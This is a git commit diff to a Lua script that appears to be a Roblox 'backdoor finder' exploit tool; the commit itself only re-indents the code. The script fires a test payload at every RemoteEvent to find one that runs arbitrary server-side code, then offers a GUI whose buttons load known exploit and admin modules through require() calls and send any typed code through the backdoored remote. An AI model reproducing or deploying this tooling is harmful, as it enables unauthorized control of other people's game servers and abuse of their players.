58ddfc17ff65194c602236d8b5fb122f5a8a4ff2
ApexdaGamer <63085708+ApexdaGamer@users.noreply.github.com>
2023-07-02 08:42:13 -0700

    Update bdf.lua
    add indentations and disable resetonspawn

--- bdf.lua
+++ bdf.lua
@@ -63,94 +63,96 @@ Gradient1.Parent = Frame1
 
 LocalScript2.Parent = Frame1
 table.insert(cors,sandbox(LocalScript2,function()
-local txt = script.Parent.Status
+	script.Parent.Parent.ResetOnSpawn = false
 
-txt.Text = [[Initialized!
+	local txt = script.Parent.Status
+
+	txt.Text = [[Initialized!
 Finding all RemoteEvents..
 .Find RE backdoor
 .Pass backdoored RE
 .Load MainUI with fancy anims]]
 
-wait(1)
+	wait(1)
 
-local remotes = {}
-for i,v in pairs(game:GetDescendants()) do
-	if v:IsA("RemoteEvent") then
-		print("Found remote: game."..v:GetFullName())
-		remotes[i] = v
+	local remotes = {}
+	for i,v in pairs(game:GetDescendants()) do
+		if v:IsA("RemoteEvent") then
+			print("Found remote: game."..v:GetFullName())
+			remotes[i] = v
+		end
 	end
-end
 
-txt.Text = [[Initialized!
+	txt.Text = [[Initialized!
 Found all RemoteEvents!
 Finding a backdoor..
 .Pass backdoored RE
 .Load MainUI with fancy anims]]
 
-wait(0.1)
+	wait(0.1)
 
-for i,remote in pairs(remotes) do
-	remote:FireServer("local i = Instance.new('BoolValue') i.Name = 'i' i.Value = true i.Parent = game.ReplicatedStorage")
-	wait(0.125)
-	if game.ReplicatedStorage:FindFirstChild("i") then
-		script.Parent.Parent.re.Value = remote
-		txt.Text = [[Initialized!
+	for i,remote in pairs(remotes) do
+		remote:FireServer("local i = Instance.new('BoolValue') i.Name = 'i' i.Value = true i.Parent = game.ReplicatedStorage")
+		wait(0.125)
+		if game.ReplicatedStorage:FindFirstChild("i") then
+			script.Parent.Parent.re.Value = remote
+			txt.Text = [[Initialized!
 Found all RemoteEvents!
 Found a backdoor!
 Passed backdoor RE!
 Loading MainUI...]]
-		for k,v in pairs(remotes) do
-			if v ~= remote then
-				table.remove(remotes,table.find(remotes,v))
+			for k,v in pairs(remotes) do
+				if v ~= remote then
+					table.remove(remotes,table.find(remotes,v))
+				end
 			end
+			game.ReplicatedStorage:FindFirstChild("i"):Destroy()
 		end
-		game.ReplicatedStorage:FindFirstChild("i"):Destroy()
 	end
-end
 
-if script.Parent.Parent.re.Value == nil then
-	txt.Text = [[Initialized!
+	if script.Parent.Parent.re.Value == nil then
+		txt.Text = [[Initialized!
 Found all RemoteEvents!
 Failed to find a backdoor!
 .Pass backdoored RE
 .Load MainUI with fancy anims]]
-	wait(5)
-	script.Disabled = true
-	script.Parent.Parent:Destroy()
-	return
-end
+		wait(5)
+		script.Disabled = true
+		script.Parent.Parent:Destroy()
+		return
+	end
 
-wait(0.2)
+	wait(0.2)
 
-txt.Text = [[Initialized!
+	txt.Text = [[Initialized!
 Found all RemoteEvents!
 Found a backdoor!
 Passed backdoor RE!
 Loaded MainUI!]]
 
-local ts = game:GetService("TweenService")
+	local ts = game:GetService("TweenService")
 
-local tp = UDim2.new(0.5, 0, -1, 0)
+	local tp = UDim2.new(0.5, 0, -1, 0)
 
-local ti = TweenInfo.new(2, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut)
-local t = ts:Create(script.Parent, ti, {Position = tp})
+	local ti = TweenInfo.new(2, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut)
+	local t = ts:Create(script.Parent, ti, {Position = tp})
 
-t:Play()
+	t:Play()
 
-wait(2)
+	wait(2)
 
-script.Parent.Parent.MainUI.Visible = true
-script.Parent.Parent.MainUI.Active = true
+	script.Parent.Parent.MainUI.Visible = true
+	script.Parent.Parent.MainUI.Active = true
 
-tp = UDim2.new(0.5,0,0.5,0)
+	tp = UDim2.new(0.5,0,0.5,0)
 
-t = ts:Create(script.Parent.Parent.MainUI, ti, {Position = tp})
+	t = ts:Create(script.Parent.Parent.MainUI, ti, {Position = tp})
 
-t:Play()
+	t:Play()
 
-wait(2)
+	wait(2)
 
-script.Parent:Destroy()
+	script.Parent:Destroy()
 end))
 TextLabel3.Name = "Status"
 TextLabel3.Parent = Frame1
@@ -174,44 +176,44 @@ TextLabel3.TextYAlignment = Enum.TextYAlignment.Top
 LocalScript4.Name = "drag"
 LocalScript4.Parent = Frame1
 table.insert(cors,sandbox(LocalScript4,function()
---Not made by me, check out this video: https://www.youtube.com/watch?v=z25nyNBG7Js&t=22s
---Put this inside of your Frame and configure the speed if you would like.
---Enjoy! Credits go to: https://www.youtube.com/watch?v=z25nyNBG7Js&t=22s
+	--Not made by me, check out this video: https://www.youtube.com/watch?v=z25nyNBG7Js&t=22s
+	--Put this inside of your Frame and configure the speed if you would like.
+	--Enjoy! Credits go to: https://www.youtube.com/watch?v=z25nyNBG7Js&t=22s
 
-local UIS = game:GetService('UserInputService')
-local frame = script.Parent
-local dragToggle = nil
-local dragSpeed = 0.25
-local dragStart = nil
-local startPos = nil
+	local UIS = game:GetService('UserInputService')
+	local frame = script.Parent
+	local dragToggle = nil
+	local dragSpeed = 0.25
+	local dragStart = nil
+	local startPos = nil
 
-local function updateInput(input)
-	local delta = input.Position - dragStart
-	local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
-		startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-	game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
-end
-
-frame.InputBegan:Connect(function(input)
-	if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
-		dragToggle = true
-		dragStart = input.Position
-		startPos = frame.Position
-		input.Changed:Connect(function()
-			if input.UserInputState == Enum.UserInputState.End then
-				dragToggle = false
-			end
-		end)
+	local function updateInput(input)
+		local delta = input.Position - dragStart
+		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
 	end
-end)
 
-UIS.InputChanged:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-		if dragToggle then
-			updateInput(input)
+	frame.InputBegan:Connect(function(input)
+		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
+			dragToggle = true
+			dragStart = input.Position
+			startPos = frame.Position
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragToggle = false
+				end
+			end)
 		end
-	end
-end)
+	end)
+
+	UIS.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			if dragToggle then
+				updateInput(input)
+			end
+		end
+	end)
 
 end))
 ObjectValue5.Name = "re"
@@ -257,9 +259,9 @@ TextButton8.TextWrap = true
 TextButton8.TextWrapped = true
 LocalScript9.Parent = TextButton8
 table.insert(cors,sandbox(LocalScript9,function()
-script.Parent.MouseButton1Down:Connect(function()
-	script.Parent.Parent.Parent.code.Text = "require(4869378421).F3X('%username%')"
-end)
+	script.Parent.MouseButton1Down:Connect(function()
+		script.Parent.Parent.Parent.code.Text = "require(4869378421).F3X('%username%')"
+	end)
 end))
 TextButton10.Name = "dex"
 TextButton10.Parent = ScrollingFrame7
@@ -281,9 +283,9 @@ TextButton10.TextWrap = true
 TextButton10.TextWrapped = true
 LocalScript11.Parent = TextButton10
 table.insert(cors,sandbox(LocalScript11,function()
-script.Parent.MouseButton1Down:Connect(function()
-	script.Parent.Parent.Parent.code.Text = "require(4786706026):dex('%username%')"
-end)
+	script.Parent.MouseButton1Down:Connect(function()
+		script.Parent.Parent.Parent.code.Text = "require(4786706026):dex('%username%')"
+	end)
 end))
 TextButton12.Name = "h-loversgui"
 TextButton12.Parent = ScrollingFrame7
@@ -305,9 +307,9 @@ TextButton12.TextWrap = true
 TextButton12.TextWrapped = true
 LocalScript13.Parent = TextButton12
 table.insert(cors,sandbox(LocalScript13,function()
-script.Parent.MouseButton1Down:Connect(function()
-	script.Parent.Parent.Parent.code.Text = "require(5346235551).B1847('%username%')"
-end)
+	script.Parent.MouseButton1Down:Connect(function()
+		script.Parent.Parent.Parent.code.Text = "require(5346235551).B1847('%username%')"
+	end)
 end))
 TextBox14.Name = "code"
 TextBox14.Parent = Frame6
@@ -350,40 +352,40 @@ TextLabel15.TextWrapped = true
 LocalScript16.Name = "drag"
 LocalScript16.Parent = TextLabel15
 table.insert(cors,sandbox(LocalScript16,function()
-local UIS = game:GetService('UserInputService')
-local frame = script.Parent.Parent
-local dragToggle = nil
-local dragSpeed = 0.5
-local dragStart = nil
-local startPos = nil
+	local UIS = game:GetService('UserInputService')
+	local frame = script.Parent.Parent
+	local dragToggle = nil
+	local dragSpeed = 0.5
+	local dragStart = nil
+	local startPos = nil
 
-local function updateInput(input)
-	local delta = input.Position - dragStart
-	local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
-		startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-	game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
-end
-
-frame.InputBegan:Connect(function(input)
-	if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
-		dragToggle = true
-		dragStart = input.Position
-		startPos = frame.Position
-		input.Changed:Connect(function()
-			if input.UserInputState == Enum.UserInputState.End then
-				dragToggle = false
-			end
-		end)
+	local function updateInput(input)
+		local delta = input.Position - dragStart
+		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
 	end
-end)
 
-UIS.InputChanged:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-		if dragToggle then
-			updateInput(input)
+	frame.InputBegan:Connect(function(input)
+		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
+			dragToggle = true
+			dragStart = input.Position
+			startPos = frame.Position
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragToggle = false
+				end
+			end)
 		end
-	end
-end)
+	end)
+
+	UIS.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			if dragToggle then
+				updateInput(input)
+			end
+		end
+	end)
 
 end))
 TextButton17.Name = "Run"
@@ -406,14 +408,14 @@ TextButton17.TextWrap = true
 TextButton17.TextWrapped = true
 LocalScript18.Parent = TextButton17
 table.insert(cors,sandbox(LocalScript18,function()
-script.Parent.MouseButton1Down:Connect(function()
-	local code = script.Parent.Parent.code.Text
-	local re = script.Parent.Parent.Parent.re.Value
+	script.Parent.MouseButton1Down:Connect(function()
+		local code = script.Parent.Parent.code.Text
+		local re = script.Parent.Parent.Parent.re.Value
 
-	code = string.gsub(code, "%%username%%", game.Players.LocalPlayer.Name)
+		code = string.gsub(code, "%%username%%", game.Players.LocalPlayer.Name)
 
-	re:FireServer(code)
-end)
+		re:FireServer(code)
+	end)
 end))
 TextButton19.Name = "Clear"
 TextButton19.Parent = Frame6
@@ -435,9 +437,9 @@ TextButton19.TextWrap = true
 TextButton19.TextWrapped = true
 LocalScript20.Parent = TextButton19
 table.insert(cors,sandbox(LocalScript20,function()
-script.Parent.MouseButton1Down:Connect(function()
-	script.Parent.Parent.code.Text = ""
-end)
+	script.Parent.MouseButton1Down:Connect(function()
+		script.Parent.Parent.code.Text = ""
+	end)
 end))
 TextButton21.Name = "Exit"
 TextButton21.Parent = Frame6
@@ -459,9 +461,9 @@ TextButton21.TextWrap = true
 TextButton21.TextWrapped = true
 LocalScript22.Parent = TextButton21
 table.insert(cors,sandbox(LocalScript22,function()
-script.Parent.MouseButton1Down:Connect(function()
-	script.Parent.Parent.Parent:Destroy()
-end)
+	script.Parent.MouseButton1Down:Connect(function()
+		script.Parent.Parent.Parent:Destroy()
+	end)
 end))
 for i,v in pairs(mas:GetChildren()) do
 	v.Parent = game:GetService("Players").LocalPlayer.PlayerGui
